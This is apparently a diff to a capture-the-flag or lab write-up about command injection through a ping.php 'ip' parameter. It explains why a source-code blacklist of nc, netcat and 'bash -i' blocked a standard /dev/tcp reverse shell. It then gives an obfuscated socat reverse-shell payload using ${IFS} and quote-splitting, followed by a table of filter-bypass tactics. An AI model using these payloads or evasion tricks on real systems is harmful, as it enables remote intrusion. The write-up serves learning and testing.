@@ -183,3 +183,55 @@ Credential Leakage:
 Disable auditd TTY logging for password input or sanitize logs
 
 Audit and rotate reused credentials across users
+
+why we used SoCat:
+
+🔍 [Optional] Step: Read Source Code of ping.php
+Once RCE was confirmed via the ip parameter, we manually viewed the PHP script to check for:
+
+Command filtering / sanitization
+
+Blacklisted keywords or strings
+
+Clues about how input is being passed to the shell
+
+bash
+Copy
+Edit
+cat ping.php
+✅ Revealed:
+
+php
+Copy
+Edit
+$blacklist = ['nc', 'netcat', 'bash -i', ...];
+🔐 Result:
+
+nc/netcat explicitly blacklisted
+
+Explains why typical reverse shell payloads like:
+
+bash
+Copy
+Edit
+bash -i >& /dev/tcp/10.10.15.252/4444 0>&1
+fail silently or trigger filtering
+
+🧠 Lesson: Why socat Worked
+socat was not blacklisted — making it a perfect alternative.
+
+Obfuscated payload (space-bypassed):
+
+bash
+Copy
+Edit
+'s'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash
+🧭 Pattern to Look For (ITTT Style):
+Got This	Do That
+✅ Gained RCE but reverse shell fails	Look for filtering in source (e.g., ping.php)
+✅ Found blacklist or hardcoded regex	Swap nc with socat, telnet, or curl
+❌ Can't use bash payloads	Try encoding, obfuscation (${IFS}, single-char split)
+✅ Able to cat server-side script	Analyze logic, bypasses, and vulnerable parameters
+
+
+
